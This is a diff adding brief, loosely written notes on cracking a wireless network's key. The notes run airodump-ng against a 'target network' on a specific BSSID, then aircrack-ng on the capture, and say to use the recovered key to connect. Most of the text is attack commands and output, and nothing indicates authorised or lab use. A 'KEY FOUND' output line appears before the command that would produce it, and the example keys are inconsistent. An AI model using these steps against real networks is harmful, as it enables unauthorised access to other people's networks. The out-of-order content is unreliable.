@@ -1,0 +1,19 @@
+Run airodump-ng to log all traffic from the target network
+> airodump-ng --channel '6' --bssid '65:22:03:36:59:50' --write 'firstDump' wlan0mon
+
+{{KEY FOUND! [ 61:6D:75:69:31 ] (ASCII: amui1 )}}
+
+At the same time we shall use aircrack-ng to try crack the key using the 
+capture file created by the above command
+> aircrack-ng 'firstDump-01.cap'
+
+Then after a time, if you being able to achieve the key, it will seems 
+something like that [ B4:3D:2A:44:CA ], remove the dots and connect to the
+network.
+
+
+
+
+
+
+
